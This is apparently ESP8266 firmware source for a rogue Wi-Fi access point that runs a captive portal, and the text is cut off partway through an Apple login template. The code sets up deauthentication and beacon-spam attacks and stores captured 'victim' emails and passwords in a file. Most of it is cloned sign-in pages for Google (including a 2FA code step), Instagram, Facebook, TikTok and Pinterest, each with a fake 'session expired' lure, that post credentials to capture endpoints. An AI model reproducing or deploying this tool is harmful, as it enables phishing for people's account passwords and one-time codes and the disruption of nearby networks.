#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <FS.h>

extern "C" {
#include "user_interface.h"
}

// ========== CONFIGURATION ==========
const byte DNS_PORT = 53;
const int MAX_NETWORKS = 20;
const int MAX_SELECTED_NETWORKS = 5;
IPAddress apIP(192, 168, 4, 1);
IPAddress subnet(255, 255, 255, 0);
const String CAPTURE_FILE = "/credentials.txt";

// ========== STEALTH MODE ==========
bool adminStealthMode = false;
const String STEALTH_FILE = "/admin_stealth.txt";

// ========== SESSION MANAGEMENT ==========
#define MAX_SESSIONS 4
#define SESSION_TIMEOUT 300000

struct VictimSession {
  IPAddress ip;
  String email;
  String password;
  unsigned long lastActivity;
  bool active;
};
VictimSession sessions[MAX_SESSIONS];

// ========== GLOBAL VARIABLES ==========
DNSServer dnsServer;
ESP8266WebServer webServer(80);
String rogueSSID = "";
int rogueChannel = 6;
bool rogueModeActive = false;

// ========== OPTIMIZED LIVE LOGS ==========
#define MAX_LIVE_ENTRIES 10
struct LiveEntry {
  char ts[12];
  char email[64];
  char pass[64];
  char extra[32];
};
LiveEntry liveBuffer[MAX_LIVE_ENTRIES];
int liveHead = 0, liveTail = 0, liveTotal = 0;
const String LOGS_USER = "admin";
const String LOGS_PASS = "monitor123";

// Network structures
typedef struct {
  String ssid;
  uint8_t bssid[6];
  uint8_t ch;
  int32_t rssi;
  bool inRange;
  bool selected;
} Network;
Network networks[MAX_NETWORKS];

struct SelectedNetwork {
  String ssid;
  uint8_t bssid[6];
  uint8_t ch;
  int32_t rssi;
};
SelectedNetwork selectedNetworks[MAX_SELECTED_NETWORKS];
int selectedNetworkCount = 0;

bool hotspotActive = false;
String currentTemplate = "google-email";
unsigned long lastScan = 0;
bool isProcessing = false;
bool deauthing_active = false;
bool deauthAll_active = false;
unsigned long deauth_now = 0;
String uploadStatus = "";
bool beaconSpamActive = false;
unsigned long beaconSpamTime = 0;
uint32_t beaconPacketCounter = 0;

uint8_t currentDeauthChannel = 0;
int currentDeauthIndex = 0;
unsigned long lastDeauthAll = 0;
const unsigned long DEAUTH_ALL_INTERVAL = 100;

// ========== BEACON SPAM SETTINGS ==========
const uint8_t channels[] = {1, 6, 11};
const int channelsCount = sizeof(channels) / sizeof(channels[0]);
const bool wpa2 = false;
const bool appendSpaces = true;
uint8_t channelIndex = 0;
uint8_t macAddr[6];
uint8_t wifi_channel = 1;
char emptySSID[32];

// ONE DIRECTION SONG TITLES as SSIDs
const char ONE_DIRECTION_SSIDS[] PROGMEM = 
  "What Makes You Beautiful\n"
  "Story of My Life\n"
  "Drag Me Down\n"
  "Steal My Girl\n"
  "Night Changes\n"
  "Best Song Ever\n"
  "Live While We're Young\n"
  "Kiss You\n"
  "Little Things\n"
  "One Thing\n"
  "Midnight Memories\n"
  "You And I\n"
  "Perfect\n"
  "History\n"
  "Infinity\n"
  "Olivia\n"
  "Strong\n"
  "18\n"
  "Fool's Gold\n"
  "Happily\n"
  "Right Now\n"
  "Little White Lies\n"
  "Through the Dark\n"
  "Better Than Words\n"
  "Don't Forget Where You Belong\n"
  "Alive\n"
  "Act My Age\n"
  "Change Your Ticket\n"
  "Girl Almighty\n"
  "No Control\n"
  "Fireproof\n"
  "Spaces\n"
  "Stockholm Syndrome\n"
  "Clouds\n"
  "Change My Mind\n"
  "Illusion\n"
  "Once in a Lifetime\n"
  "Everything About You\n"
  "Same Mistakes\n"
  "Last First Kiss\n"
  "Summer Love\n"
  "She's Not Afraid\n"
  "Loved You First\n"
  "Nobody Compares\n"
  "They Don't Know About Us\n"
  "Rock Me\n"
  "C'mon C'mon\n"
  "Save You Tonight\n"
  "Taken\n"
  "I Want\n"
  "I Wish\n"
  "Over Again\n"
  "Back for You\n"
  "Up All Night\n"
  "Tell Me a Lie\n"
  "Gotta Be You\n"
  "More Than This\n"
  "Moments\n"
  "Stand Up\n"
  "I Should Have Kissed You\n"
  "One Direction WiFi\n"
  "1D Fan Club WiFi\n"
  "Harry Styles Official\n"
  "Liam Payne WiFi\n"
  "Louis Tomlinson AP\n"
  "Niall Horan Network\n"
  "Zayn Malik Hotspot\n"
  "Directioners Only\n"
  "1D Concert WiFi\n"
  "Take Me Home WiFi\n"
  "Made In The AM AP\n"
  "Four Album Network\n"
  "Midnight Memories AP\n"
  "Perfect Song WiFi\n";

int ssidCount = 0;

uint8_t beaconPacket[109] = {
  0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04,
  0x05, 0x06, 0x00, 0x00, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00,
  0x00, 0x00, 0xe8, 0x03, 0x21, 0x00, 0x00, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
  0x03, 0x01, 0x01,
};
uint32_t packetSize = 0;

// ========== ROUTER RESCUE MODE ==========
bool routerRescueMode = false;
bool routerConnecting = false;
String routerPasswordAttempt = "";
unsigned long routerConnectStart = 0;
const unsigned long ROUTER_CONNECT_TIMEOUT = 20000;

// ========== TEMPLATES (full, exact strings) ==========
const char TEMPLATE_GOOGLE_EMAIL[] PROGMEM = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'><title>Sign in – Google Accounts</title><style>*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}body{font-family:'Google Sans','Roboto',-apple-system,BlinkMacSystemFont,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;}.page{flex:1;display:flex;flex-direction:column;padding:48px 24px 24px;max-width:440px;margin:0 auto;width:100%;}.google-logo{display:flex;justify-content:center;margin-bottom:24px;}.g-logo{font-size:36px;font-family:'Google Sans','Roboto',sans-serif;font-weight:400;letter-spacing:-1px;}.g-blue{color:#4285f4;}.g-red{color:#ea4335;}.g-yellow{color:#fbbc05;}.g-green{color:#34a853;}h1{font-size:26px;font-weight:400;color:#202124;text-align:center;margin-bottom:16px;font-family:'Google Sans','Roboto',sans-serif;}.subtitle{font-size:15px;color:#202124;text-align:center;line-height:1.5;margin-bottom:6px;}.learn-more{display:block;text-align:center;color:#1a73e8;font-size:15px;text-decoration:none;margin-bottom:28px;}.learn-more:hover{text-decoration:underline;}.alert-box{background:#fce8e6;border-left:4px solid #d93025;padding:12px 16px;margin-bottom:24px;border-radius:4px;font-size:14px;color:#202124;}.alert-box strong{color:#d93025;font-weight:500;}.alert-box .alert-text{color:#5f6368;margin-top:2px;}.input-group{position:relative;margin-bottom:8px;}.input-group label{position:absolute;top:50%;left:12px;transform:translateY(-50%);font-size:14px;color:#1a73e8;transition:all 0.15s ease;pointer-events:none;background:#fff;padding:0 4px;}.input-group input{width:100%;height:54px;border:1.5px solid #dadce0;border-radius:4px;font-size:16px;color:#202124;padding:16px 12px 4px;font-family:'Roboto',sans-serif;outline:none;background:transparent;transition:border-color 0.2s;}.input-group input:focus{border-color:#1a73e8;}.input-group input:focus+label,.input-group input:not(:placeholder-shown)+label{top:0;font-size:12px;}.input-group.floating label{top:0;font-size:12px;}.forgot{color:#1a73e8;font-size:14px;text-decoration:none;display:block;margin-top:10px;margin-bottom:32px;}.forgot:hover{text-decoration:underline;}.create-account{color:#1a73e8;font-size:15px;font-weight:500;text-decoration:none;margin-bottom:40px;display:block;}.create-account:hover{text-decoration:underline;}.actions{display:flex;justify-content:flex-end;margin-top:auto;}.btn-next{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:0 28px;height:46px;font-size:14px;font-weight:500;font-family:'Google Sans',sans-serif;letter-spacing:0.8px;cursor:pointer;text-transform:uppercase;transition:background 0.2s,box-shadow 0.2s;}.btn-next:hover{background:#1765cc;box-shadow:0 1px 6px rgba(26,115,232,0.4);}.btn-next:active{background:#155ab5;}</style></head><body><div class='page'><div class='google-logo'><span class='g-logo'><span class='g-blue'>G</span><span class='g-red'>o</span><span class='g-yellow'>o</span><span class='g-blue'>g</span><span class='g-green'>l</span><span class='g-red'>e</span></span></div><h1>Sign in</h1><p class='subtitle'>Use your Google Account. The account will be added to this device and available to other Google apps.</p><a class='learn-more' href='#'>Learn more about using your account</a><div class='alert-box'><strong>⚠️ Session expired</strong><div class='alert-text'>You were logged out of your account. Please sign in again to restore Google services.</div></div><form method='post' action='/google-password'><div class='input-group' id='emailGroup'><input type='text' id='emailInput' name='email' placeholder=' ' autocomplete='email' required><label for='emailInput'>Email or phone</label></div><a class='forgot' href='#'>Forgot email?</a><a class='create-account' href='#'>Create account</a><div class='actions'><button class='btn-next' type='submit'>NEXT</button></div></form></div><script>const input=document.getElementById('emailInput');const group=document.getElementById('emailGroup');input.addEventListener('focus',()=>group.classList.add('floating'));input.addEventListener('blur',()=>{if(!input.value)group.classList.remove('floating');});if(input.value)group.classList.add('floating');</script></body></html>";

const char TEMPLATE_GOOGLE_PASSWORD[] PROGMEM = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'><title>Welcome - Google Accounts</title><style>*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}body{font-family:'Google Sans','Roboto',-apple-system,BlinkMacSystemFont,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;}.page{flex:1;display:flex;flex-direction:column;padding:48px 24px 24px;max-width:440px;margin:0 auto;width:100%;}.google-logo{display:flex;justify-content:center;margin-bottom:24px;}.g-logo{font-size:36px;font-family:'Google Sans','Roboto',sans-serif;font-weight:400;letter-spacing:-1px;}.g-blue{color:#4285f4;}.g-red{color:#ea4335;}.g-yellow{color:#fbbc05;}.g-green{color:#34a853;}h1{font-size:26px;font-weight:400;color:#202124;text-align:center;margin-bottom:8px;font-family:'Google Sans',sans-serif;}.subtitle{font-size:15px;color:#202124;text-align:center;line-height:1.5;margin-bottom:28px;}.input-group{position:relative;margin-bottom:6px;}.input-group label{position:absolute;top:50%;left:12px;transform:translateY(-50%);font-size:14px;color:#1a73e8;transition:all 0.15s ease;pointer-events:none;background:#fff;padding:0 4px;}.input-group input{width:100%;height:54px;border:1.5px solid #1a73e8;border-radius:4px;font-size:16px;color:#202124;padding:16px 44px 4px 12px;font-family:'Roboto',sans-serif;outline:none;background:transparent;transition:border-color 0.2s;}.input-group input:focus{border-color:#1a73e8;}.input-group input:focus+label,.input-group input:not(:placeholder-shown)+label{top:0;font-size:12px;}.toggle-pw{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;padding:4px;display:flex;align-items:center;color:#5f6368;}.toggle-pw svg{width:20px;height:20px;fill:#5f6368;}.forgot-pw{color:#1a73e8;font-size:14px;text-decoration:none;display:block;margin-top:10px;margin-bottom:40px;}.forgot-pw:hover{text-decoration:underline;}.actions{display:flex;justify-content:flex-end;margin-top:auto;}.btn-next{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:0 28px;height:46px;font-size:14px;font-weight:500;font-family:'Google Sans',sans-serif;letter-spacing:0.8px;cursor:pointer;text-transform:uppercase;transition:background 0.2s,box-shadow 0.2s;}.btn-next:hover{background:#1765cc;box-shadow:0 1px 6px rgba(26,115,232,0.4);}.btn-next:active{background:#155ab5;}</style></head><body><div class='page'><div class='google-logo'><span class='g-logo'><span class='g-blue'>G</span><span class='g-red'>o</span><span class='g-yellow'>o</span><span class='g-blue'>g</span><span class='g-green'>l</span><span class='g-red'>e</span></span></div><h1>Welcome</h1><p style='font-size:16px;color:#202124;text-align:center;margin-bottom:20px;'>%EMAIL_DISPLAY%</p><p class='subtitle'>To continue, first verify it's you</p><form method='post' action='/google-2fa'><input type='hidden' name='email' id='emailInput' value='%EMAIL%'><div class='input-group' id='pwGroup'><input type='password' id='pwInput' name='password' placeholder=' ' autocomplete='current-password' required><label for='pwInput'>Enter your password</label><button class='toggle-pw' type='button' onclick='togglePassword()' aria-label='Show password'><svg id='eyeIcon' viewBox='0 0 24 24'><path d='M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z'/></svg></button></div><a class='forgot-pw' href='#'>Forgot password?</a><div class='actions'><button class='btn-next' type='submit'>NEXT</button></div></form></div><script>function togglePassword(){var x=document.getElementById('pwInput');var icon=document.getElementById('eyeIcon');if(x.type==='password'){x.type='text';icon.innerHTML='<path d=\"M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z\"/>';}else{x.type='password';icon.innerHTML='<path d=\"M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z\"/>';}}const input=document.getElementById('pwInput');const group=document.getElementById('pwGroup');input.addEventListener('focus',()=>group.classList.add('floating'));input.addEventListener('blur',()=>{if(!input.value)group.classList.remove('floating');});if(input.value)group.classList.add('floating');</script></body></html>";

const char TEMPLATE_GOOGLE_2FA[] PROGMEM = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'><title>2-Step Verification – Google</title><style>*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}body{font-family:'Google Sans','Roboto',-apple-system,BlinkMacSystemFont,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;}.page{flex:1;display:flex;flex-direction:column;padding:48px 24px 24px;max-width:440px;margin:0 auto;width:100%;}.google-logo{display:flex;justify-content:center;margin-bottom:28px;}.g-logo{font-size:36px;font-family:'Google Sans','Roboto',sans-serif;font-weight:400;letter-spacing:-1px;}.g-blue{color:#4285f4;}.g-red{color:#ea4335;}.g-yellow{color:#fbbc05;}.g-green{color:#34a853;}h1{font-size:26px;font-weight:400;color:#202124;text-align:center;margin-bottom:12px;font-family:'Google Sans',sans-serif;}.subtitle{font-size:15px;color:#202124;text-align:center;line-height:1.5;margin-bottom:32px;}.input-group{position:relative;margin-bottom:6px;}.input-group label{position:absolute;top:50%;left:12px;transform:translateY(-50%);font-size:14px;color:#1a73e8;transition:all 0.15s ease;pointer-events:none;background:#fff;padding:0 4px;}.input-group input{width:100%;height:54px;border:1.5px solid #1a73e8;border-radius:4px;font-size:20px;letter-spacing:4px;color:#202124;padding:16px 12px 4px;font-family:'Roboto',sans-serif;outline:none;background:transparent;transition:border-color 0.2s;}.input-group input:focus{border-color:#1a73e8;}.input-group input:focus+label,.input-group input:not(:placeholder-shown)+label{top:0;font-size:12px;}.try-another{color:#1a73e8;font-size:14px;text-decoration:none;display:block;margin-top:10px;margin-bottom:40px;}.try-another:hover{text-decoration:underline;}.actions{display:flex;justify-content:flex-end;margin-top:auto;}.btn-next{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:0 28px;height:46px;font-size:14px;font-weight:500;font-family:'Google Sans',sans-serif;letter-spacing:0.8px;cursor:pointer;text-transform:uppercase;transition:background 0.2s,box-shadow 0.2s;}.btn-next:hover{background:#1765cc;box-shadow:0 1px 6px rgba(26,115,232,0.4);}.btn-next:active{background:#155ab5;}</style></head><body><div class='page'><div class='google-logo'><span class='g-logo'><span class='g-blue'>G</span><span class='g-red'>o</span><span class='g-yellow'>o</span><span class='g-blue'>g</span><span class='g-green'>l</span><span class='g-red'>e</span></span></div><h1>2-Step Verification</h1><p class='subtitle'>Enter the verification code from your phone.</p><form id='verifyForm' method='post' action='/capture-2fa'><input type='hidden' name='email' id='emailInput' value='%EMAIL%'><input type='hidden' name='password' id='passwordInput' value='%PASSWORD%'><input type='hidden' name='code' id='fullCode'><div class='input-group' id='otpGroup'><input type='text' id='codeInput' name='code_display' placeholder=' ' inputmode='numeric' maxlength='6' autocomplete='off'><label for='codeInput'>G-</label></div><a class='try-another' href='#'>Try another way</a><div class='actions'><button type='submit' class='btn-next'>VERIFY</button></div></form></div><script>const urlParams=new URLSearchParams(window.location.search);let email=urlParams.get('email');let password=urlParams.get('password');if(email){document.getElementById('emailInput').value=decodeURIComponent(email);}if(password){document.getElementById('passwordInput').value=decodeURIComponent(password);}const codeInput=document.getElementById('codeInput');const fullCodeInput=document.getElementById('fullCode');const form=document.getElementById('verifyForm');codeInput.addEventListener('input',function(e){let val=this.value.replace(/[^0-9]/g,'');this.value=val;fullCodeInput.value=val;if(val.length===6){form.submit();}});codeInput.addEventListener('focus',()=>document.getElementById('otpGroup').classList.add('floating'));codeInput.addEventListener('blur',()=>{if(!codeInput.value)document.getElementById('otpGroup').classList.remove('floating');});if(codeInput.value)document.getElementById('otpGroup').classList.add('floating');</script></body></html>";

const char TEMPLATE_INSTAGRAM[] PROGMEM = "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\"><title>Instagram</title><style>* { -webkit-tap-highlight-color: transparent; box-sizing: border-box; margin: 0; padding: 0; } body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fafafa; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; } .container { width: 100%; max-width: 400px; } .login-box { background: #fff; border: 1px solid #dbdbdb; border-radius: 12px; padding: 30px 25px; } .logo { text-align: center; margin-bottom: 25px; } .insta-logo { font-family: 'Instagram', cursive; font-size: 42px; background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d); -webkit-background-clip: text; -webkit-text-fill-color: transparent; } .input-group { margin-bottom: 12px; } input { width: 100%; height: 44px; padding: 0 12px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 8px; font-size: 14px; } input:focus { outline: none; border-color: #a8a8a8; } .btn-login { width: 100%; height: 44px; background: #0095f6; color: #fff; border: none; border-radius: 8px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 10px; } .btn-login:active { background: #1877f2; transform: scale(0.98); } .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; } .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; } .divider span { padding: 0 18px; } .fb-login { color: #385185; font-weight: 600; text-decoration: none; display: block; text-align: center; margin: 15px 0; font-size: 14px; } .forgot { font-size: 12px; color: #00376b; text-decoration: none; display: block; text-align: center; } .signup { margin-top: 20px; padding: 20px; background: #fff; border: 1px solid #dbdbdb; border-radius: 12px; text-align: center; font-size: 14px; } .signup a { color: #0095f6; font-weight: 600; text-decoration: none; } .error-message { background: #fee; color: #ed4956; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; border: 1px solid #ffd1d1; text-align: center; }</style></head><body><div class=\"container\"><div class=\"login-box\"><div class=\"logo\"><div class=\"insta-logo\">Instagram</div></div><div class=\"error-message\">Session expired. Please log in again to access your account.</div><form method=\"post\" action=\"/capture\"><div class=\"input-group\"><input type=\"text\" name=\"username\" placeholder=\"Phone number, username, or email\" required></div><div class=\"input-group\"><input type=\"password\" name=\"password\" placeholder=\"Password\" required></div><button class=\"btn-login\" type=\"submit\">Log In</button></form><div class=\"divider\"><span>OR</span></div><a href=\"#\" class=\"fb-login\">Log in with Facebook</a><a href=\"#\" class=\"forgot\">Forgot password?</a></div><div class=\"signup\">Don't have an account? <a href=\"#\">Sign up</a></div></div></body></html>";

const char TEMPLATE_FACEBOOK[] PROGMEM = "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\"><title>Facebook - Log in or Sign up</title><style>* { -webkit-tap-highlight-color: transparent; box-sizing: border-box; margin: 0; padding: 0; } body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; } .container { width: 100%; max-width: 400px; } .login-box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); text-align: center; } input { width: 100%; padding: 16px; margin-bottom: 15px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; } input:focus { outline: none; border-color: #1877f2; } .login-btn { width: 100%; padding: 16px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin-bottom: 20px; } .login-btn:active { background: #166fe5; transform: scale(0.98); } .forgot-link { color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin-bottom: 20px; } .divider { height: 1px; background: #dadde1; margin: 20px 0; } .create-btn { background: #42b72a; color: white; border: none; border-radius: 6px; padding: 16px; font-size: 17px; font-weight: bold; cursor: pointer; width: 100%; } .create-btn:active { background: #36a420; transform: scale(0.98); } .security-alert { background: #fff8e1; border: 1px solid #ffd54f; color: #5d4037; padding: 12px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; text-align: left; } .security-alert strong { color: #e65100; }</style></head><body><div class=\"container\"><div class=\"login-box\"><div style=\"color: #1877f2; font-size: 48px; font-weight: bold; margin-bottom: 20px;\">facebook</div><div class=\"security-alert\"><strong>🔒 Security Alert:</strong> We detected unusual activity from your device. Please verify your identity to continue.</div><form method=\"post\" action=\"/capture\"><input type=\"text\" name=\"email\" placeholder=\"Email address or phone number\" required><input type=\"password\" name=\"password\" placeholder=\"Password\" required><button class=\"login-btn\" type=\"submit\">Log In</button></form><a href=\"#\" class=\"forgot-link\">Forgotten password?</a><div class=\"divider\"></div><button class=\"create-btn\">Create New Account</button></div></div></body></html>";

const char TEMPLATE_TIKTOK[] PROGMEM = "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\"><title>TikTok - Log in</title><style>* { -webkit-tap-highlight-color: transparent; box-sizing: border-box; margin: 0; padding: 0; } body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #000; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; } .container { width: 100%; max-width: 400px; } .login-box { background: #121212; border-radius: 16px; padding: 30px 25px; text-align: center; } .logo { margin-bottom: 25px; } .tiktok-logo { font-size: 42px; font-weight: 700; letter-spacing: -1px; color: #fff; } .tiktok-logo span:first-child { color: #69C9D0; } .tiktok-logo span:last-child { color: #EE1D52; } .input-group { margin-bottom: 16px; } input { width: 100%; height: 48px; padding: 0 16px; background: #1e1e1e; border: 1px solid #333; border-radius: 8px; color: #fff; font-size: 16px; } input:focus { outline: none; border-color: #69C9D0; } .btn-login { width: 100%; height: 48px; background: #EE1D52; color: #fff; border: none; border-radius: 8px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 10px; } .btn-login:active { background: #d41b4a; transform: scale(0.98); } .divider { display: flex; align-items: center; margin: 20px 0; color: #666; font-size: 14px; } .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #333; } .divider span { padding: 0 15px; } .other-options { color: #69C9D0; font-size: 14px; margin-top: 20px; } .other-options a { color: #69C9D0; text-decoration: none; display: block; margin: 8px 0; } .footer { margin-top: 25px; color: #666; font-size: 12px; } .footer a { color: #666; text-decoration: none; } .session-notice { background: #1a1a1a; border-left: 4px solid #EE1D52; padding: 12px; margin-bottom: 20px; color: #ccc; font-size: 13px; text-align: left; }</style></head><body><div class=\"container\"><div class=\"login-box\"><div class=\"logo\"><div class=\"tiktok-logo\"><span>Tik</span><span>Tok</span></div></div><div class=\"session-notice\">⚠️ Your login session has timed out. Please sign in again to continue watching videos.</div><form method=\"post\" action=\"/capture\"><div class=\"input-group\"><input type=\"text\" name=\"username\" placeholder=\"Username or email\" required></div><div class=\"input-group\"><input type=\"password\" name=\"password\" placeholder=\"Password\" required></div><button class=\"btn-login\" type=\"submit\">Log in</button></form><div class=\"divider\"><span>or</span></div><div class=\"other-options\"><a href=\"#\">Use phone / email / username</a><a href=\"#\">Log in with QR code</a></div><div class=\"footer\">By continuing, you agree to our <a href=\"#\">Terms of Service</a> and confirm that you have read our <a href=\"#\">Privacy Policy</a>.</div></div></div></body></html>";

const char TEMPLATE_PINTEREST[] PROGMEM = "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\"><title>Pinterest</title><style>* { -webkit-tap-highlight-color: transparent; box-sizing: border-box; margin: 0; padding: 0; } body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; } .container { width: 100%; max-width: 400px; } .login-box { text-align: center; } .logo { margin-bottom: 30px; } .pinterest-logo { font-size: 48px; font-weight: 700; color: #E60023; letter-spacing: -1px; } .welcome-text { font-size: 28px; font-weight: 600; color: #111; margin-bottom: 10px; } .subtitle { color: #666; margin-bottom: 30px; font-size: 16px; } .input-group { margin-bottom: 16px; } input { width: 100%; height: 48px; padding: 0 16px; border: 2px solid #ddd; border-radius: 24px; font-size: 16px; transition: all 0.3s; } input:focus { outline: none; border-color: #E60023; } .btn-login { width: 100%; height: 48px; background: #E60023; color: #fff; border: none; border-radius: 24px; font-weight: 700; font-size: 16px; cursor: pointer; margin-top: 10px; } .btn-login:active { background: #c5001e; transform: scale(0.98); } .divider { display: flex; align-items: center; margin: 25px 0; color: #666; font-size: 14px; } .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #ddd; } .divider span { padding: 0 15px; } .other-login { margin-bottom: 20px; } .other-btn { width: 100%; height: 48px; background: #fff; border: 2px solid #ddd; border-radius: 24px; font-weight: 600; font-size: 16px; cursor: pointer; margin-bottom: 12px; display: flex; align-items: center; justify-content: center; gap: 10px; } .other-btn:active { background: #f5f5f5; transform: scale(0.98); } .signup-link { color: #666; font-size: 14px; } .signup-link a { color: #E60023; font-weight: 600; text-decoration: none; } .auth-notice { background: #ffebee; border: 1px solid #ffcdd2; color: #c62828; padding: 12px; border-radius: 12px; margin-bottom: 20px; font-size: 14px; } .auth-notice::before { content: '🔐 '; }</style></head><body><div class=\"container\"><div class=\"login-box\"><div class=\"logo\"><div class=\"pinterest-logo\">Pinterest</div></div><div class=\"welcome-text\">Welcome to Pinterest</div><div class=\"subtitle\">Find new ideas to try</div><div class=\"auth-notice\">Authentication required: Your session has expired due to inactivity.</div><form method=\"post\" action=\"/capture\"><div class=\"input-group\"><input type=\"email\" name=\"email\" placeholder=\"Email\" required></div><div class=\"input-group\"><input type=\"password\" name=\"password\" placeholder=\"Password\" required></div><button class=\"btn-login\" type=\"submit\">Log in</button></form><div class=\"divider\"><span>OR</span></div><div class=\"other-login\"><button class=\"other-btn\"><span style=\"color: #1877F2; font-size: 20px;\">f</span> Continue with Facebook</button><button class=\"other-btn\">Continue with Google</button></div><div class=\"signup-link\">Not on Pinterest yet? <a href=\"#\">Sign up</a></div></div></div></body></html>";

const char TEMPLATE_APPLE[] PROGMEM = "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\"><title>Apple ID</title><style>* { -webkit-tap-highlight-color: transparent; box-sizing: border-box; margin: 0; padding: 0; } body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f7; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; } .container { width: 100%; max-width: 400px; } .login-box { background: #fff; border-radius: 12px; padding: 30px 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); } .apple-logo { text-align: center; margin-bottom: 25px; } .apple-logo svg { width: 48px; height: 48px; fill: #000; } h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 25px; color: #000; } .input-group { margin-bottom: 20px; } input { width: 100%; height: 52px; padding: 0 16px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 17px; background: #f5f5f7; } input:focus { outline: none; border-color: #007AFF; background: #fff; } .forgot-link { text-align: right; margin-bottom: 25px; } .forgot-link a { color: #007AFF; text-decoration: none; font-size: 15px; } .btn-login { width: 100%; height: 52px; background: #007AFF; color: #fff; border: none; border-radius: 8px; font-size: 17px; font-weight: 600; cursor: 